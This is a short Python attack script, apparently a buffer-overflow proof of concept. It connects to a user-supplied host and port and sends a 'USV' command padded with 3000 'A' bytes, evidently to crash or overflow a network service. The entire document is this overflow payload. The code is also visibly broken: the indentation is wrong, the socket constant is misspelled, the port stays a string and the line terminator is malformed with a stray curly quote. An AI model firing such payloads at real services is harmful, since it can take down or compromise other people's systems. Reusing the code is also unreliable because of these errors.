#! /usr/bin/python
import sys,socket 
for carg in sys.argv:
 if carg == "-s":
  argnum = sys.argv.index(carg)
  argnum += 1
  host = sys.argv[argnum]
elif carg == "-p":
 argnum = sys.argv.index(carg)
 argnum += 1
 port = sys.argv[argnum]
buffer = "\x41"* 3000
s = socket.socket(socket.AF_INET, socket.SOCK_STRAEM)
s.connect((host,port))
s.send("USV " + buffer + "//r//n//r”)
s.close()
